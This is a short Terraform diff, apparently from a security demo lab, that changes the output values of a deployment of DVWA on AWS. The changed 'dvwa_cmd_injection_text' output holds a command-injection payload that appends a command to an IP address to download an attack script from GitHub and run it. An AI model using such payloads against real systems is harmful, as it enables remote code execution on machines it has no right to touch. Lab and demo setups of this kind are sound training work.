@@ -150,5 +150,5 @@ output "get_public_ip" {
   value = "aws ec2 describe-instances --instance-ids ${aws_instance.s1_wiz_instance.id} | jq -r '.Reservations[].Instances[].PublicIpAddress'"
 }
 output "dvwa_cmd_injection_text" {
-  value = "127.0.0.1; curl -s https://raw.githubusercontent.com/s1-howie/s1-wiz/main/s1-wiz-attack.sh | bash"
+  value = "127.0.0.1; curl -sLO https://raw.githubusercontent.com/s1-howie/s1-wiz/main/s1-wiz-attack.sh; chmod +x s1-wiz-attack.sh; ./s1-wiz-attack.sh ${local.workstation-external-cidr}"
 }
